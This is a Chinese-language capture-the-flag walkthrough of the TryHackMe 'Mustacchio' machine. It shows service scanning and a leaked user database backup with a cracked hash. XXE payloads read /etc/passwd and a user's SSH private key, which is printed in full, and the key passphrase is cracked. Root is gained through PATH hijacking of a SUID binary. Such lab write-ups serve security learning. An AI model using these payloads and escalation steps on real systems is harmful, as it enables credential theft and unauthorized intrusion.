# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务发现
```
┌──(root💀kali)-[~/tryhackme/Mustacchio]
└─# nmap -sV -Pn 10.10.7.89    
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 01:33 EST
Nmap scan report for 10.10.7.89
Host is up (0.34s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.25 seconds
```

看上去只开启了两个服务

## 爆破目录

```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.7.89                                                                      

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.7.89/_21-11-08_01-36-40.txt

Error Log: /root/dirsearch/logs/errors-21-11-08_01-36-40.log

Target: http://10.10.7.89/

[01:36:41] Starting:                                         
[01:37:08] 200 -    3KB - /about.html                                       
[01:37:42] 400 -  305B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[01:37:45] 200 -    1KB - /contact.html                                     
[01:37:47] 200 -    1KB - /custom/                                          
[01:37:56] 301 -  314B  - /fonts  ->  http://10.10.7.89/fonts/           
[01:37:57] 200 -    2KB - /gallery.html                                     
[01:38:01] 200 -    2KB - /index.html                                       
[01:38:02] 301 -  315B  - /images  ->  http://10.10.7.89/images/         
[01:38:02] 200 -    6KB - /images/                                          
[01:38:30] 200 -   28B  - /robots.txt                                       
[01:38:31] 403 -  278B  - /server-status                                    
[01:38:32] 403 -  278B  - /server-status/  
```

```/custom/```存在目录遍历漏洞，在这里找到一个users.bak文件，下载下来用strings命令查看

```
┌──(root💀kali)-[~/Downloads]
└─# strings users.bak               
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

```

我们看到是一个SQLite的用户列表，有用户名和密码：```admin：1868e36a6d2b17d4c2745f1659433a54d4bc5f4b```

哈希拿到[这个牛逼的md5解密网站](https://www.somd5.com/),解出来是：

> bulldog19

所以是什么服务的登陆凭证？试了ssh不行，也找不到登陆页面，重新用一个web字典爆破目录，没有新的目录爆出来

## 全端口扫描
我做lab时有个习惯，一般是用nmap快速扫描常用端口，扫描完后一边开始渗透常用端口，一边再全端口扫描一次，在我回过头来查看全端口扫描时发现这个靶机还有一个http服务在8765端口
```
┌──(root💀kali)-[~/tryhackme/Mustacchio]
└─# nmap -sV -Pn 10.10.7.89 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 01:35 EST
Nmap scan report for 10.10.7.89
Host is up (0.31s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1139.53 seconds

```

浏览器打开是一个登陆页面，就是用上面的登陆凭证。

# xxe攻击

登陆进来有一个留言页面，尝试输入一些信息，没有任何返回，用burpsuite截断http请求，放到repeater，发现回显源码里透露了两个信息

一是输入内容必须是xml格式，二是网页源码里有一行注释：
> Barry, you can now SSH in using your key!

现在我们至少知道有一个ssh用户名：```barry```

我在谷歌上搜索```xxe php```找到了[这篇关于xxe的文章](https://www.kingkk.com/2018/07/%E7%AE%80%E6%9E%90XXE/)

我们构造payload尝试读取```/etc/passwd```里的数据
```
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
	<name>&xxe;</name>
</root>
```

成功在网页上收到回显
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

我们之前尝试爆破barry的ssh密码，但是被告知不允许密码登陆
利用xxe漏洞，我们尝试读取barry的ssh秘钥信息。用户秘钥一般放在```/home/$USER/.ssh/id_rsa```

我们构造下面payload
```
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >
]>
<root>
	<name>&xxe;</name>
</root>

```

成功收到秘钥回显
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

我们把上面的秘钥在kali上保存成一个id_rsa文件，赋权600
此秘钥还不能正常登陆，需要用john破解秘钥密码：

```
┌──(root💀kali)-[~/tryhackme/Mustacchio]
└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/Mustacchio]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)
1g 0:00:00:23 37.67% (ETA: 02:48:42) 0.04221g/s 233721p/s 233721c/s 233721C/s mikkedhaile..mikkal1933
Session aborted
```

得到密码：```urieljames```

# 拿到初始shell

成功登录到barry的ssh，拿到user.txt

```
┌──(root💀kali)-[~/tryhackme/Mustacchio]
└─# ssh -i id_rsa barry@10.10.7.89                                                                                                                                                                                                   1 ⨯
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ ls
user.txt
```

# 提权到root
查找靶机上的所有SUID文件
```
barry@mustacchio:~$ find / -perm -4000 -print
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

我们发现一个特别的文件```/home/joe/live_log```，用strings命令查看一下这个文件的内容

```
barry@mustacchio:/home/joe$ strings live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

留意这行shell代码```tail -f /var/log/nginx/access.log```，表明这个SUID文件会调用tail命令监听web日志。

我们可以利用上面的shell命令提权到root

## 把/home/barry写入$PATH
```
barry@mustacchio:/home/joe$ export PATH=/home/barry:$PATH
```
## 查看现在当前用户的$PATH
```
barry@mustacchio:/home/joe$ echo $PATH
/home/barry:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

## 创建一个tail文件，并且给予执行权限
```
barry@mustacchio:/home/joe$ touch /home/barry/tail
barry@mustacchio:/home/joe$ chmod +x /home/barry/tail
```

## 把下面的shell写进/home/barry/tail
```
#!/bin/bash
bash -p
```

## 执行live_log，成功提权到root
```
barry@mustacchio:/home/joe$ vi /home/barry/tail
barry@mustacchio:/home/joe$ cat /home/barry/tail
#!/bin/bash
bash -p
barry@mustacchio:/home/joe$ ./live_log 
root@mustacchio:/home/joe# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
root@mustacchio:/home/joe# whoami
root
root@mustacchio:/home/joe# cat /root/root.txt 
```